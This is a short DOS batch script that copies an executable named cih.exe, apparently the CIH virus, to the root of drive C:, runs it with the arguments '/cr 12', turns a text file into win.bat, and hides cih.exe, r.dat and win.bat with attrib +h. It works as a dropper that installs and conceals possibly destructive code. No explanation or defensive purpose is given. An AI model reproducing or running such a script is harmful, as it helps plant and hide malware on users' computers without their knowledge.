@echo off
if exist c:\win.bat del c:\win.bat
if exist c:\info.txt del c:\info.txt
copy info.txt c:\
if not exist c:\cih.exe copy cih.exe c:\

c:
cd\
cih /cr 12
ren info.txt win.bat
attrib +h cih.exe
attrib +h r.dat
attrib +h win.bat